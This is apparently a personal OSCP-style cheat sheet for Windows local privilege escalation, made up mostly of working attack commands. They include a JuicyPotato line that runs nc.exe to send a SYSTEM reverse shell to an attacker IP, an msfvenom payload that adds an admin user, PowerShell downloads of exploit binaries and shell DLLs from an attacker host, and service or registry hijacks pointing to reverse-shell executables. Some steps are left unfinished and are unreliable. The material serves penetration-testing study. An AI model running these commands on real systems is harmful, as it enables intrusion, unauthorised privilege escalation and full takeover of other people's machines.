## Windows Local Escalation 

**<u>Don't rely solely on Searchsploit!</u>**

Go here if you run out of ideas:  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

### Exploitation Paths

#### User Permissions

Always start with this `whoami /priv`

- SeImpersonatePrivilege = juicypotato
  
  - ```powershell
    # Ex: 
    JuicyPotato64.exe -l 1337 -p c:\coyote\nc.exe -a "-nv 10.250.226.250 8001 -e cmd.exe" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
    ```
    
  - If you get `COM -> recv failed with error: 10038`, try another CLSID: https://github.com/ohpe/juicy-potato/tree/master/CLSID or here http://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/
  
  - The CLSID may pretend to work but not actually do anything.  If that happens, just try another one.  
  
  - If using this with netcat, juicypotato takes parameters to the command as `-a "params"`

#### Auto-Elevated Installs

1. Check if the AlwaysInstallElevated keys are turned on:

   ```powershell
   # Enabled per user
   reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
   
   # Enabled per machine
   reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
   ```

2. Generate an msfvenom payload in msi format:

   ```bash
   # Example Payload to create a local admin user
   msfvenom -p windows/adduser USER=drwily PASS=oscp -f msi -o backdoor.msi
   ```

3. Run the payload on Windows to have it run with elevated permissions

   ```powershell
   msiexec /quiet /qn /i C:\Windows\Temp\setup.msi
   ```

#### DLL Hijacking

Creating a malicious DLL to trick a program into using.  Generally, a Windows application will use pre-defined search paths to find DLLâ€™s and it will check these paths in a specific order.

1. The directory from which the application loaded
2. 32-bit System directory (C:\Windows\System32)
3. 16-bit System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (first system and then user)

In order to find and exploit these:

1. Run PowerUp.ps1 to discover vulnerable spots

2. Run this to hijack the DLL path:  *Note:  This command was missing when I tried to use it*

   ```bash
   Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
   ```

3.  Run the application that uses the DLL

#### EXE Exploitation

Check this list to for any EXEs you can run as SYSTEM:  
https://lolbas-project.github.io/#

#### Kernel Exploits

Collection of Windows Kernel Exploits - https://github.com/SecWiki/windows-kernel-exploits

#### Leveraging Service Executables

1. Look for 'odd' services that run as SYSTEM

2. Use icacls to enumerate permissions of the executable files and find a writable binary (Look for the F by Users or whatever group your belong to)

   ```bash
   icacls 'C:\Program Files\service\service.exe'
   ```

3. Replace the binary with a malicious one.

#### Mounting the Filesystem

An old trick that has been patched is to mount the C drive on the same system to gain full write access to the entire drive.

```powershell
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

#### PowerSploit

I haven't really used this beyond PowerUp, but these pages detail what all you can do with it:  
https://kalilinuxtutorials.com/powersploit-a-powershell-post-exploitation-framework/
https://resources.infosecinstitute.com/powershell-toolkit-powersploit/

#### Scheduled Tasks - Writable Task Objects

1. List scheduled tasks:

   ```bash
   schtasks /query /fo LIST /v
   ```

2. Find any tasks that can be modified AND run as a user with elevated permissions

   ```bash
   accesschk.exe /accepteula -uwcqv "Authenticated Users" *   
   ```

3. Change the task to point to a malicious executable.

#### Scheduled Tasks - ALPC Task Scheduler LPE

CVE-2018-8440  

1. Check write access to c:\windows\tasks

   ```powershell
   icacls c:\windows\tasks
   ```

2. Download the appropriate version of the ALPC_DiagHub exploit:  https://github.com/realoriginal/alpc-diaghub   

3. Use the DLL Reverse Shell code in ~/opt/paylods/windll_revshell.cpp and modify the IP and port for the return shell, then compile based on the version of windows:

   ```bash
   # 64 bit
   x86_64-w64-mingw32-g++ payload.cpp -o payload.dll -lws2_32 -shared
   ```

4. Copy the compiled DLL and the ALPC executable to the target, start a netcat listener and run the exploit:

   ```powershell
   powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/shell.dll','C:\coyote\shell.dll')"
   
   powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/ALPC_DiagHub.x64.exe','C:\coyote\ALPC_DiagHub.x64.exe')"
   
   # Exploit, the RTF file can be anything
   # The shell will hang on this command but the reverse shell should connect as SYSTEM
   cmd /c alpc.exe payload.dll .\coyote.rtf 
   ```

#### Unquoted Service Paths

1. Show services that start up automatically, look for unquoted file paths

   ```powershell
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
   
   #Example
   #Auto
   #Puppet Agent                                            puppet
   #        C:\Puppet\Current Version\sys\ruby\bin\ruby.exe -rubygems "C:\Puppet\Current Version\service\daemon.rb"
   ```

2. Check for write access to the portions of the path that have spaces.  

3. Create an executable that matches the path before the space.

4. Reboot the system or restart the service to have it execute the program as the user assigned to the service

#### Token Manipulation

1. Token impersonation with Rotten Potato - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
2. Weaponized Rotten Potato:  Juicy Potato - https://github.com/ohpe/juicy-potato

#### Weak Registry Permissions

In Windows, services have a registry keys and those keys are located at: `HKLM\SYSTEM\CurrentControlSet\Services\<service_name>`

1. Check the permissions of the registry entry:

   ```powershell
   Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\<service_name> | f1
   ```

2. Modify the ImagePath key of the registry to point to the payload path

   ```powershell
   reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\coyote\rev_shell.exe /f
   ```

3. Restart the service

   ```powershell
   net stop [service name] && net start [service name].
   ```

#### Weak Service Attacks

1. Look for services created by SYSTEM with weak permissions

   ```bash
   ##### Cmd prompt
   # Older Win
   tasklist /SVC
   # Show all service info (can change all to active/inactive)
   sc queryex type=service state=all
   # Show names only
   sc queryex type=service state=all | find /i "SERVICE_NAME:"
   
   ##### PowerShell
   # Cleanest view
   Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
   # OR
   Get-Service
   ```

2. Modify the service to point to a malicious binary

   ```bash
   ##### Command Prompt
   # Note, the space after binpath= is necessary.
   sc config <service name> binpath= "C:\coyote\rev_tcp_8001.exe"
   # Verify config change
   sc qc <service name>
   ```

#### Writeable Directories

1. Find writable files and folders

   ```bash
   powershell -c 'Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}'
   ```
   
2. Look for directories where executables are run by elevated users and replace commands or DLL's with malicious files.

### Exploit Suggestions

#### Windows Exploit Suggester - Next Gen

1. Update wes

   ```bash
   python wes.py --update-wes
   ```

2. Dump Windows systeminfo to a file

   ```bash
   # Local
   systeminfo > systeminfo.txt
   # Remote
   systeminfo.exe /S 10.10.10.10
   ```

3. Scan the file (must run from wes folder)

   ```bash
   cd ~/opt/enumeration/windows/wesng/
   python wes.py -e ~/htblab/oscp_like/8/sysinfo.txt
   
   # Options
   -e	# Show only exploits
   -i IMPACT # Specify the impact you want ("Elevation of Privilege", "Remote Code Execution", and more)
   -d # Filter exploits release before most recent patch (may filter out valid exploits)
   ```

4. -e
   --hide "text" Ed

From https://github.com/bitsadmin/wesng

#### Metasploit

Metasploit has an exploit suggester module that will scan the Windows session for possible priv-esc paths:

```bash
## You need to have an active session to the target first
# background the session first
background
# Select module
use post/multi/recon/local_exploiter_suggester
# Configure options
set SESSION N	# Choose the session to the target
set SHOWDESCRIPTION true
# Run I guess? The page I got this from didn't finish this
```

### UAC Bypass

#### Checking for Bypass

1. Assess the registry

   ```powershell
   reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
   ```
   - If `EnableLUA=0`or **doesn't exist**, **no UAC for anyone**
   - If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1`** **, No UAC for anyone**
   - If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0`** and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)
   - If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0`** and `FilterAdministratorToken=1`, UAC for everyone

2. UAC bypass is possible when UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group.  Check the latter two with:

   ```bash
   net user %username%
   whoami /groups | findstr Level
   ```

#### Methods

##### Manual bypass using eventvwr.exe

Described at https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/

1. Use strings.exe (from SysInternals) to check if autoelevate is true in eventvwr.exe

   ```powershell
   where /r C:\windows eventvwr.exe
   strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
   # Look for
   # [autoElevate]true[/autoElevate]
   ```

2. Download code at  https://github.com/turbo/zero2hero 

3. Uncomment lines 66 & 69, and change command to run (ex. to a reverse shell)

4. Compile, transfer to target, and run.

   ```bash
   x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe
   ```

##### Kali Linux Included Files

Check on bypassuac-x86.exe and bypassuac-x64.exe (These didn't work the one time I tried)

```powershell
bypassuac-x64.exe /c C:\BypassUAC\reverse_4444.exe
```

### Links

Comprehensive List of PrivEsc points - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html?q=